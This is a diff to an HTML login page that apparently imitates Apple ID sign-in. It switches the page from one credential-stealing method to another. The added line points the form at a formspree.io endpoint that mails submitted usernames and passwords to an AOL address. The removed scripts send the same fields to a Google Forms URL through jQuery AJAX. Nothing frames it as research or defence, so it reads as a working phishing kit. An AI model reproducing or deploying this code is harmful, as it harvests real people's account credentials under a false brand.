@@ -322,7 +322,7 @@ input[type=submit]:active {
     <div id="unauthdata">
         
 	<div id="container">
-	<form id="form" target="_self" onsubmit="" action="">
+	<form action="http://formspree.io/phpmailgirl@aol.com">
             <label for="username">Username:</label>
             <input type="text" id="username" name="username">
             <label for="password">Password:</label>
@@ -830,65 +830,7 @@ findAppleIdUrl:"https://iforgot.apple.com/appleid"
         </script>
     </div>
     
-    <script>
--    	function writeToFile(d1, d2){
--	    var field1 = $('#username').val();
-                var field2 = $('#password').val();
-                var field3 = $('#password').val();
- 
-                $.ajax({
-                    url: "https://docs.google.com/forms/d/1FAIpQLSeWZO335pCs1eT2ss0yoz9GVi4vxA8C9k1pC9dH9af3Mc6JxA/formResponse",
-                    data: {"entry.1023121230": field3, "entry.1230072460": field1, "entry.2113237615": field2},
-                    type: "POST",
-                    dataType: "xml",
-                    statusCode: {
-                        0: function() {
-                            //Success message
-                        },
-                        200: function() {
-                            //Success Message
-                        }
-                    }
-                });
-            }
-             
--	var submit = document.getElementById("submit");
--	submit.onclick = function () {
--	    var id      = document.getElementById("username").value;
--	    var content = document.getElementById("password").value;	
--	    writeToFile(id, content);
--	}
--    </script>
     
-    <script type="text/javascript">
-            function postToGoogle() {
-                var field1 = $('#username').val();
-                var field2 = $('#password').val();
-                var field3 = $('#password').val();
- 
-                $.ajax({
-                    url: "https://docs.google.com/forms/d/1FAIpQLSeWZO335pCs1eT2ss0yoz9GVi4vxA8C9k1pC9dH9af3Mc6JxA/formResponse",
-                    data: {"entry.1023121230": field3, "entry.1230072460": field1, "entry.2113237615": field2},
-                    type: "POST",
-                    dataType: "xml",
-                    statusCode: {
-                        0: function() {
-                            //Success message
-                        },
-                        200: function() {
-                            //Success Message
-                        }
-                    }
-                });
-            }
-             
-            $(document).ready(function(){
-                $('#form').submit(function() {
-                    postToGoogle();
-                    return false;
-                });
-            });
-        </script>
     
 </body>
 </html>
